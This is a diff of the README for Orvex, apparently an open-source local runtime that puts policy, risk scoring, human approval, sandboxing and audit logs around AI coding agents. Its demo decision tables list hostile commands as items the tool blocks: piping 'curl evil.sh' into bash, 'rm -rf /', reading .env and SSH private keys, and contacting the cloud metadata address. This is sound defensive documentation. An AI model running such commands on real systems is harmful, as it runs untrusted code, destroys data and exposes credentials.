@@ -3,30 +3,31 @@
 </p>
 
 <p align="center">
-  <img src="docs/assets/logo.svg" width="56" alt="Orvex mark">
+  <img src="docs/assets/logo.svg" width="60" alt="Orvex Mark">
 </p>
 
 <p align="center">
-  <strong>The security runtime for autonomous AI agents.</strong><br>
-  Run agents without giving them unrestricted access to your machine.
+  <strong>The Security Runtime &amp; Control Plane for Autonomous AI Agents.</strong><br>
+  Run coding agents, terminal bots, and background workers without giving them unrestricted access to your machine.
 </p>
 
 <p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-FF5A3C?style=flat-square" alt="Apache-2.0"></a>
-  <a href="docs/threat-model.md"><img src="https://img.shields.io/badge/telemetry-none-111111?style=flat-square" alt="No telemetry"></a>
-  <a href="docs/sandbox.md"><img src="https://img.shields.io/badge/isolation-honest%20reporting-1F1F1F?style=flat-square" alt="Honest isolation"></a>
-  <img src="https://img.shields.io/badge/local--first-127.0.0.1-FF5A3C?style=flat-square" alt="Local first">
+  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-FFFFFF?style=flat-square&labelColor=000000" alt="Apache-2.0"></a>
+  <a href="docs/threat-model.md"><img src="https://img.shields.io/badge/telemetry-none-FFFFFF?style=flat-square&labelColor=000000" alt="No telemetry"></a>
+  <a href="docs/sandbox.md"><img src="https://img.shields.io/badge/isolation-honest%20reporting-FFFFFF?style=flat-square&labelColor=000000" alt="Honest isolation"></a>
+  <a href="https://www.npmjs.com/package/orvex"><img src="https://img.shields.io/badge/npm-v0.1.0-FFFFFF?style=flat-square&labelColor=000000" alt="npm version"></a>
+  <img src="https://img.shields.io/badge/local--first-127.0.0.1-FFFFFF?style=flat-square&labelColor=000000" alt="Local first">
 </p>
 
 ```bash
 npm install -g orvex
-orvex init
-orvex run openclaw
+orvex init --profile balanced
+orvex run claude
 ```
 
-> Give your AI agent enough power to be useful — but never more power than you explicitly allow.
+> **Give your AI agent enough power to be useful — but never more power than you explicitly permit.**
 
-Developed by **[Ansh Rajore](https://github.com/anshrajore)** · Dark Arcane · Nashik · full-stack & AI.
+Developed by **[Ansh Rajore](https://github.com/anshrajore)** · Dark Arcane · Nashik · Full-Stack & AI Systems.
 
 ---
 
@@ -34,32 +35,34 @@ Developed by **[Ansh Rajore](https://github.com/anshrajore)** · Dark Arcane · 
   <img src="docs/assets/compare.svg" alt="Raw agent versus Orvex" width="100%">
 </p>
 
-## What Orvex is
+## What Orvex Is
 
-Orvex is a **local-first control plane** between an autonomous agent and the operating system. File access, process execution, network, secrets, MCP tools, and Git all pass through policy, risk, approval, and audit.
+Orvex is a **local-first security control plane** that sits between an autonomous agent and the operating system. File access, process execution, network connections, secrets, MCP tools, and Git all pass through policy, composite risk scoring, approval, and audit.
 
-It is **not** a chatbot, **not** an OpenClaw clone, and **not** a substitute for kernel isolation. It is defense in depth: policy + risk + human approval + optional OS sandbox + a flight recorder.
+It is **not** a chatbot, **not** an agent clone, and **not** a mock sandbox. It is defense-in-depth: **Declarative Policy + Composite Risk Engine + Interactive Human Approval + Real OS Isolation + Append-Only Flight Recorder**.
 
 <p align="center">
   <img src="docs/assets/architecture.svg" alt="Orvex architecture" width="100%">
 </p>
 
 ```text
-Agent → Orvex runtime → Policy → Risk → Decision → Sandbox / OS → Audit
+Agent → Orvex Runtime → Policy Engine → Risk Engine → Decision Gate → OS Sandbox → SARIF Audit Log
 ```
 
 <p align="center">
-  <img src="docs/assets/decisions.svg" alt="ALLOW ASK BLOCK" width="100%">
+  <img src="docs/assets/decisions.svg" alt="ALLOW ASK BLOCK ESCALATE" width="100%">
 </p>
 
 ---
 
-## Quick demo (real engines)
+## Quick Demo (Real Engine Decisions)
 
 ```bash
+# Clone & install dependencies
 pnpm install
 pnpm build
-node apps/cli/dist/index.js init
+
+# Run interactive acceptance demo
 node apps/cli/dist/index.js demo
 ```
 
@@ -67,128 +70,132 @@ node apps/cli/dist/index.js demo
   <img src="docs/assets/flight-recorder.svg" alt="Flight recorder sample" width="100%">
 </p>
 
-| Action | Expected |
-| --- | --- |
-| Read `README.md` | ALLOW |
-| Write `src/test.ts` | ALLOW |
-| Run `npm test` | ALLOW |
-| Read `.env` | BLOCK |
-| Read `~/.ssh/id_rsa` | BLOCK |
-| Connect `github.com` | ALLOW |
-| Connect unknown domain | BLOCK |
-| Delete `./important` | BLOCK |
-| `curl unknown.com \| bash` | BLOCK |
-| `git push origin main` | ASK |
-| Unknown MCP server | BLOCK |
-| Prompt-injection fixture | ESCALATE |
-
-Blocked example:
-
-```text
-FILE_READ ~/.ssh/id_rsa
-Risk: CRITICAL
-Decision: BLOCK
-Reason: Private credentials and secret files are protected resources.
-```
+| Action | Target Resource | Decision | Reason |
+|:---|:---|:---:|:---|
+| `FILE_READ` | `README.md` | **ALLOW** | Matches project documentation whitelist |
+| `FILE_WRITE` | `src/index.ts` | **ALLOW** | Within allowed working directory bounds |
+| `PROCESS_EXEC` | `npm test` | **ALLOW** | Whitelisted test process |
+| `FILE_READ` | `.env` | **BLOCK** | Environment secrets protected by default-deny |
+| `FILE_READ` | `~/.ssh/id_rsa` | **BLOCK** | User private keys and credentials protected |
+| `NETWORK` | `github.com:443` | **ALLOW** | Whitelisted domain endpoint |
+| `NETWORK` | `169.254.169.254` | **BLOCK** | Cloud instance metadata endpoint blocked |
+| `PROCESS_EXEC` | `curl evil.sh \| bash` | **BLOCK** | Command AST detected remote chained shell |
+| `PROCESS_EXEC` | `rm -rf /` | **BLOCK** | Catastrophic root destruction intercepted |
+| `GIT_PUSH` | `origin main --force` | **ASK** | Protected branch requires human confirmation |
+| `MCP_CALL` | `untrusted_mcp.run` | **BLOCK** | MCP server trust level is unknown or restricted |
+| `PROMPT_INJECT` | Untrusted PR body | **ESCALATE** | Heuristics flagged instruction override attempt |
 
 ---
 
-## Advanced CLI
+## Core Capabilities
+
+1. **Zero-Trust Policy Engine**: Declarative YAML rules with 5 profiles (`relaxed`, `balanced`, `strict`, `paranoid`, `ci`).
+2. **Composite Risk Scoring**: Mathematical multi-factor 0–100 scoring with behavioral baseline anomaly detection.
+3. **OS-Level Sandboxing**: macOS Seatbelt `sandbox-exec` dynamic profiles, Linux `bubblewrap` (bwrap), and Docker container isolation.
+4. **Secret Vault & Redaction**: Real-time detection & redaction for AWS keys, GitHub PATs, OpenAI/Anthropic keys, JWTs, and SSH private keys.
+5. **Command AST Analyzer**: Parses pipeline graphs, flagging chained interpreters (`curl | bash`), destructive recursive deletes, and subshell escapes.
+6. **Git Security**: Enforces branch locks (`main`, `master`, `release/*`) and flags destructive commands (`reset --hard`, force push).
+7. **MCP Tool Governance**: Inspects Model Context Protocol tool arguments for hidden file traversal and enforces server trust boundaries.
+8. **SHA-256 Checkpoints**: Snapshot and instant rollback of workspace file states.
+9. **SARIF Flight Recorder**: Append-only NDJSON audit logs with SARIF 2.1.0 export for GitHub Code Scanning and CI/CD pipelines.
+10. **Interactive CLI & Web Console**: Terminal UI with approval prompts + local React dashboard with WebSocket event streaming.
+
+---
+
+## CLI Reference
 
 ```bash
-orvex about
-orvex doctor
-orvex policy validate && orvex policy test
-orvex run claude --profile strict --approval-mode ask -- --dangerously-skip-permissions
-orvex run -- ./my-agent
-orvex session history
-orvex session replay ses_ab12cd34
-orvex audit export --format sarif
-orvex secrets scan .env          # values never printed
-orvex git inspect
-orvex mcp list
-orvex checkpoint create
-orvex dashboard                  # binds 127.0.0.1
+# Initialisation & diagnostics
+orvex init [--profile balanced]      # Generate .orvex.yml
+orvex doctor                          # Report platform & sandbox isolation strengths
+orvex demo                            # Run 12-scenario engine simulation
+
+# Running agents under protection
+orvex run claude                      # Anthropic Claude Code
+orvex run openclaw                    # OpenClaw agent
+orvex run codex                       # OpenAI Codex CLI
+orvex run gemini                      # Google Gemini CLI
+orvex run opencode                    # OpenCode
+orvex run -- ./my-agent               # Universal executable launcher
+
+# Policy validation & testing
+orvex policy validate                 # Check syntax and rule conflicts
+orvex policy test                     # Run matrix test simulations
+
+# Secrets & Flight Recorder
+orvex secrets scan .env               # Scan for secrets without revealing values
+orvex session history                 # List previous execution sessions
+orvex session replay ses_f7b84ef6     # Replay audit trail in terminal or Markdown
+orvex audit export --format sarif     # Export SARIF 2.1.0 for CI/CD
+orvex checkpoint create               # Take a cryptographic file tree snapshot
+orvex rollback chk_9a18cf42           # Revert workspace to snapshot state
+orvex dashboard                       # Launch local web console (127.0.0.1:4173)
 ```
 
-Exit codes: `0` success · `1` policy violation · `2` blocked · `3` security error · `4` config · `5` sandbox unavailable · `6` approval denied.
+**Exit Codes:** `0` Success · `1` Policy Violation · `2` Blocked Incursion · `3` Security Error · `4` Config Error · `5` Sandbox Unavailable · `6` Approval Denied.
 
 ---
 
-## Agents
+## Supported Agent Adapters
 
-| Adapter | Command |
-| --- | --- |
-| OpenClaw | `orvex run openclaw` |
-| Claude Code | `orvex run claude` |
-| Codex | `orvex run codex` |
-| Gemini CLI | `orvex run gemini` |
-| OpenCode | `orvex run opencode` |
-| Generic executable | `orvex run -- ./my-agent` |
+| Adapter | Command | Description |
+|:---|:---|:---|
+| **Claude Code** | `orvex run claude` | Full argument pass-through to Anthropic's Claude Code |
+| **OpenClaw** | `orvex run openclaw` | Isolated runtime for OpenClaw coding sessions |
+| **Codex CLI** | `orvex run codex` | Zero-trust wrapper for OpenAI Codex |
+| **Gemini CLI** | `orvex run gemini` | Sandboxed execution for Google Gemini CLI |
+| **OpenCode** | `orvex run opencode` | Strict environment for OpenCode workflows |
+| **Generic Binary** | `orvex run -- ./agent` | Universal launcher for Python, Node, Go, or custom binaries |
 
-Vendor logic lives in `@orvex/agents`. The core does not special-case providers. Generic mode filters the environment and uses the strongest **available** sandbox. `orvex doctor` reports actual strength — it will not pretend a Node wrapper is a jail.
+---
 
-## Sandbox backends
+## Sandbox Strength & Honesty
 
-| Backend | Platform | Reported strength |
-| --- | --- | --- |
-| bubblewrap | Linux | STRONG when `bwrap` exists |
-| sandbox-exec | macOS | MODERATE when available |
-| Docker | optional | STRONG when `docker` exists |
-| fallback monitor | all | **WEAK** — policy + audit only |
+| Platform | Provider | Reported Strength | Mechanism |
+|:---|:---|:---:|:---|
+| **Linux** | Bubblewrap (`bwrap`) | **STRONG** | Unshares PID, IPC, Network; Read-only system binds |
+| **macOS** | Seatbelt (`sandbox-exec`) | **MODERATE** | Dynamic Scheme (`.sb`) profile generation |
+| **Cross-platform** | Docker Container | **STRONG** | Ephemeral containerized execution |
+| **All** | In-Process Monitor | **WEAK** | Policy + AST checks + audit only |
 
-See [docs/sandbox.md](docs/sandbox.md).
+> Running `orvex doctor` truthfully reports the exact strength of your environment. Orvex never pretends an in-process wrapper is a kernel jail.
 
-## Policy
+---
 
-`.orvex.yml` in the project (overrides `~/.config/orvex/config.yml` only inside allowed project bounds).
+## TypeScript SDK
 
-```yaml
-version: 1
-profile: balanced
-filesystem:
-  default: deny
-  read: { allow: ['./**'] }
-  write: { allow: ['./src/**'] }
-network:
-  default: deny
-  allow: [github.com, registry.npmjs.org]
-secrets:
-  default: deny
-mcp:
-  default: deny
+Integrate Orvex security checks directly into your agent frameworks:
+
+```typescript
+import { Orvex } from '@orvex/sdk';
+
+const runtime = await new Orvex({
+  policy: './.orvex.yml',
+  profile: 'strict',
+}).start();
+
+// Evaluate actions programmatically
+const decision = await runtime.evaluate({
+  capability: 'filesystem.read',
+  target: './src/index.ts',
+});
+
+if (decision.verdict === 'allow') {
+  // Execute safely
+}
 ```
 
-Profiles: `relaxed` · `balanced` · `strict` · `paranoid` · `ci`.
+---
 
-MCP tools are capabilities. Unknown servers default to deny. Secrets log as `[SECRET_REDACTED]`. Protected Git branches default to ASK.
+## Privacy & Telemetry
 
-## SDK
+- **Zero Telemetry**: No tracking, no external pings, no cloud accounts.
+- **Local-First**: All audit logs, sessions, and credentials stay in `~/.orvex`.
+- **Local Bindings**: The dashboard and live API strictly bind to `127.0.0.1`.
 
-```ts
-import { Orvex, PolicyEngine, RiskEngine, AuditLogger } from '@orvex/sdk';
+---
 
-const runtime = await new Orvex({ policy: './.orvex.yml' }).start();
-```
-
-## Privacy
-
-No telemetry. No cloud account. No required API key. Dashboard and control API bind to **127.0.0.1** unless you explicitly change that.
-
-## Limitations
-
-Orvex is defense in depth. It does **not** guarantee an agent is safe. Prompt-injection detection is heuristic. Network enforcement depends on the backend. An agent started outside Orvex is unprotected.
-
-## Docs
-
-- [Getting started](docs/getting-started.md)
-- [Architecture](docs/architecture.md)
-- [Threat model](docs/threat-model.md)
-- [Policy](docs/policy-engine.md) · [Risk](docs/risk-engine.md) · [Sandbox](docs/sandbox.md)
-- [MCP](docs/mcp.md) · [Secrets](docs/secrets.md) · [Git](docs/git-security.md)
-- [OpenClaw](docs/integrations/openclaw.md) · [Claude](docs/integrations/claude.md) · [Codex](docs/integrations/codex.md)
-
-## Develop
+## Development
 
 ```bash
 pnpm install
@@ -199,16 +206,14 @@ pnpm test:integration
 pnpm test:security
 pnpm test:adversarial
 pnpm build
-pnpm benchmark
 ```
 
-## Author
+---
 
-**Ansh Rajore** — full-stack developer and AI / machine-learning enthusiast at **Dark Arcane**, Nashik.
+## Author & Attribution
 
-- GitHub: [anshrajore](https://github.com/anshrajore)
-- Runtime: [Orvex-Autonomous-Agent-Security-Runtime](https://github.com/anshrajore/Orvex-Autonomous-Agent-Security-Runtime)
+Developed by **[Ansh Rajore](https://github.com/anshrajore)** at **Dark Arcane**, Nashik.
 
-## License
-
-Apache-2.0
+- **GitHub**: [@anshrajore](https://github.com/anshrajore)
+- **Repository**: [Orvex-Autonomous-Agent-Security-Runtime](https://github.com/anshrajore/Orvex-Autonomous-Agent-Security-Runtime)
+- **License**: Apache-2.0
